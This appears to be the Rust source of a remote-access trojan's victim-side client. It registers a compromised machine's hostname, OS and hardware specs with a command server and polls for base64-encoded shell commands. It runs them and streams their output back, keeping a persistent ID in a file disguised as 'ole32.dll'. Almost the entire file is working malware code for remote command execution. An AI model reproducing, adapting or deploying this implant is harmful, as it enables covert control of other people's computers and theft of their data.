// Include our profile.rs, generated by the build script
include!(concat!(env!("OUT_DIR"), "/profile.rs"));

use base64::engine::{general_purpose::STANDARD as b64, Engine};
use reqwest::{
    blocking as rq,
    header::{HeaderMap, HeaderValue},
    StatusCode as st,
};
use serde::{Deserialize, Serialize};
use shlex::split;
use std::{
    fs,
    io::{self, BufRead},
    os::unix::process::ExitStatusExt,
    process as ps,
    thread::{self, JoinHandle},
    time::Duration,
};
use sys_info::{hostname, os_type};
use uuid::Uuid;

pub fn run() {
    // Initializing variables from Profile JSON.
    let config = Config::new();
    let endpoints = EndPoints::new();
    // Get our client
    let client = get_client(config.token);

    // Register
    register(&client, &endpoints.register);

    // Mainloop
    mainloop(&client, &endpoints, &config)
}

trait SafeSend {
    // Send requests with auto retry functionality
    fn safe_send(self) -> rq::Response;
    fn safe_body<T: Clone + Into<rq::Body>>(self, body: T) -> rq::RequestBuilder;
}

impl SafeSend for rq::RequestBuilder {
    fn safe_body<T: Clone + Into<rq::Body>>(self, body: T) -> rq::RequestBuilder {
        self.body(body)
    }

    fn safe_send(self) -> rq::Response {
        let mut loop_count = 0;
        let config = Config::new();

        loop {
            // We can be sure we will clone successfully
            // because we will use `safe_body`, which make sure
            // the body is clone able.
            if let Ok(result) = self.try_clone().unwrap().send() {
                // send was successful
                break result;
            } else {
                // send failed, so this is determines how many seconds
                // before retrying.
                let sleep_duration = if loop_count > 6 {
                    config.max_reconnect_timeout
                } else {
                    config.min_reconnect_timeout
                };
                sleep(sleep_duration.into());
            }

            loop_count += 1;
        }
    }
}

#[derive(Serialize, Deserialize, Debug)]
struct Response<'a> {
    stdout: &'a str,
    stderr: &'a str,
}

#[derive(Serialize, Deserialize, Debug)]
struct PostRes<'a> {
    session_id: &'a str,
    response: Response<'a>,
    empty: bool,
    failed_to_execute: bool,
    command_status_code: Option<i32>,
}

impl<'a> PostRes<'a> {
    fn new(
        session_id: &'a str,
        stdout: &'a str,
        stderr: &'a str,
        empty: bool,
        failed_to_execute: bool,
        command_status_code: Option<i32>,
    ) -> PostRes<'a> {
        PostRes {
            session_id,
            response: Response { stdout, stderr },
            empty,
            failed_to_execute,
            command_status_code,
        }
    }
}

pub fn mainloop(client: &rq::Client, endpoints: &EndPoints, config: &Config) {
    // Part of the code that repeats for the duration of the program
    loop {
        let session_id = loop {
            // fetch the session_id by requesting the server for it every
            // configured second, when session is found the session_id will be returned
            // to the variable
            let get_session = client.get(&endpoints.get_session).safe_send();

            if get_session.status() == st::OK {
                break get_session.text().unwrap();
            }

            // the request for a session_id will be twice as slow as
            // if we are trying to fetch a command from the server which should
            // happen much more quicker
            sleep(config.request_rate as u32 * 2);
        };

        // The fetch_cmd -> execute_cmd -> post_res phase
        loop {
            let command = loop {
                let cmd_res = client
                    .get(&endpoints.fetch_cmd)
                    .safe_body(session_id.clone())
                    .safe_send();

                if cmd_res.status() == st::OK {
                    let res_string = cmd_res.text().unwrap();
                    break Some(b64_decode(&res_string));
                } else if cmd_res.status() == st::NO_CONTENT {
                    // this means if the hacker didn't provide a command
                    // where we will just retry
                    sleep(config.request_rate.into());
                } else {
                    // Session has been killed, so let's get out
                    // or may be some other weird stuff happened
                    break None;
                }
            };

            // If the session is dead, we're gonna need to return to
            // getting session_id's(the outer loop). so break.
            if let None = command {
                break;
            }

            // Command execution
            let command = command.unwrap();

            // simplify sending a failed to execute
            let failed_to_execute = || {
                client
                    .post(&endpoints.post_res)
                    .safe_body(
                        b64.encode(
                            serde_json::to_string(&PostRes::new(
                                &session_id,
                                "",
                                "",
                                false,
                                true,
                                None,
                            ))
                            .unwrap(),
                        ),
                    )
                    .safe_send();
            };

            // break down command into a vec using shlex
            let command = match split(&command) {
                None => {
                    failed_to_execute();
                    break;
                }
                Some(cmd) => {
                    if cmd.is_empty() {
                        failed_to_execute();
                        break;
                    } else {
                        cmd
                    }
                }
            };

            // the GLORIOUS command execution
            execute_command(
                &command,
                client.clone(),
                b64_decode(&session_id),
                endpoints.post_res.to_owned(),
                failed_to_execute,
            );
        }
    }
}

fn send_cmd_execution_output(client: &rq::Client, post_res_path: &str, post_body: &PostRes) {
    client
        .post(post_res_path)
        .safe_body(b64.encode(serde_json::to_string(post_body).unwrap()))
        .safe_send();
}

fn execute_command<F: Fn()>(
    command: &Vec<String>,
    client: rq::Client,
    session_id: String,
    post_res_path: String,
    failed_to_execute: F,
) {
    let command = ps::Command::new(command.get(0).unwrap())
        .args(&command[1..])
        .stdout(ps::Stdio::piped())
        .stderr(ps::Stdio::piped())
        .spawn();

    match command {
        Ok(mut child) => {
            let stdout_write_thread: JoinHandle<()>;
            let stderr_write_thread: JoinHandle<()>;

            // Child process successfully spawned
            if let Some(stderr) = child.stderr.take() {
                let reader = io::BufReader::new(stderr);
                let client = client.clone();
                let session_id = session_id.clone();
                let post_cmd_path = post_res_path.clone();
                stderr_write_thread = thread::spawn(move || {
                    for line in reader.lines() {
                        // Send the line to the server
                        let current_line = line.unwrap();
                        let post_body =
                            PostRes::new(&session_id, "", &current_line, false, false, None);
                        send_cmd_execution_output(&client, &post_cmd_path, &post_body);
                    }
                });
            } else {
                failed_to_execute();
                return;
            }

            if let Some(stdout) = child.stdout.take() {
                let reader = io::BufReader::new(stdout);
                let client = client.clone();
                let session_id = session_id.clone();
                let post_cmd_path = post_res_path.clone();
                stdout_write_thread = thread::spawn(move || {
                    for line in reader.lines() {
                        // Send the line to the server
                        let current_line = line.unwrap();
                        let post_body =
                            PostRes::new(&session_id, &current_line, "", false, false, None);
                        send_cmd_execution_output(&client, &post_cmd_path, &post_body);
                    }
                });
            } else {
                failed_to_execute();
                return;
            }

            // make sure the stdout, and stderr threads finish
            stdout_write_thread.join().unwrap();
            stderr_write_thread.join().unwrap();
            // Wait for the child process to finish
            match child.wait() {
                Ok(status_code) => {
                    let final_status_code: i32;
                    if let Some(st_code) = status_code.code() {
                        final_status_code = st_code
                    } else {
                        // TODO: Fix the unsafe unwrap, that may lead to a panic
                        final_status_code = status_code.signal().unwrap();
                    }
                    let post_body =
                        PostRes::new(&session_id, "", "", false, false, Some(final_status_code));
                    send_cmd_execution_output(&client, &post_res_path, &post_body);
                }
                Err(_) => {
                    failed_to_execute();
                    return;
                }
            };
        }
        Err(_) => {
            // Failed to spawn the child process
            failed_to_execute();
        }
    }
}

fn b64_decode(encoded_str: &str) -> String {
    // May panic
    String::from_utf8(b64.decode(encoded_str).unwrap()).unwrap()
}

fn get_client_id(file_path: &str) -> String {
    // Get client_id from where it's stored from.
    // Closure for regenerating the client_id file.
    let regenerate = || {
        // Create a new file, and read from that, inserting a new
        // client_id into the file.

        // Newly generated ID
        let new_id = Uuid::new_v4().to_string();
        let encoded_id = b64.encode(new_id.as_bytes());
        // Even if the next line panics, we don't have
        // any other recovery plans at the moment
        fs::write(file_path, &encoded_id).unwrap();
        encoded_id
    };
    let content = fs::read_to_string(file_path).unwrap_or_else(|_| regenerate());

    // The error handling here ensures that if we can't parse the contents using b64
    // we'll regenerate the file and parse it again.
    String::from_utf8(b64.decode(&content).unwrap_or_else(|_| {
        let encoded_id = regenerate();
        b64.decode(&encoded_id).unwrap()
    }))
    .unwrap()
}

fn get_client(token: &str) -> rq::Client {
    // Persistent client id.
    let client_id = get_client_id("./ole32.dll");

    let mut headers = HeaderMap::new();
    headers.insert(
        "Authorization",
        HeaderValue::from_str(&format!("Basic {}", b64.encode(token.as_bytes()))).unwrap(),
    );
    headers.insert(
        "client-id",
        HeaderValue::from_str(&client_id.to_string()).unwrap(),
    );
    headers.insert("client-type", HeaderValue::from_static("2")); // 2 represents the victim client id

    // Let's first connect with the server
    rq::Client::builder()
        .default_headers(headers)
        .build()
        .unwrap()
}

#[derive(Serialize, Deserialize, Default)]
struct VictimSpecs {
    host_name: Option<String>,
    os: Option<String>,
    arch: Option<String>,
    clock_speed: Option<u64>,
    ram: Option<f64>,
}

impl VictimSpecs {
    fn generate() -> VictimSpecs {
        // Generate configurations according to the PC's specs
        let host_name = hostname().ok();
        let os = os_type().ok();

        // TODO: Make the ARCH fetching at runtime.
        let arch = Some(std::env::consts::ARCH.to_string());

        let clock_speed = sys_info::cpu_speed().ok();

        let ram = match sys_info::mem_info() {
            // changing to GBs.
            Ok(mem_info) => Some(mem_info.total as f64 / (1024_f64.powf(2.0))),
            Err(_) => None,
        };

        VictimSpecs {
            host_name,
            os,
            arch,
            clock_speed,
            ram,
        }
    }
}

fn register(client: &rq::Client, register_path: &str) {
    let victim_specs = VictimSpecs::generate();

    let status = client
        .post(register_path)
        .safe_body(b64.encode(serde_json::to_value(victim_specs).unwrap().to_string()))
        .safe_send()
        .status();

    if status == st::INTERNAL_SERVER_ERROR {
        panic!();
    }
}

// Convenience function
fn sleep(time: u32) {
    thread::sleep(Duration::from_secs(time.into()));
}
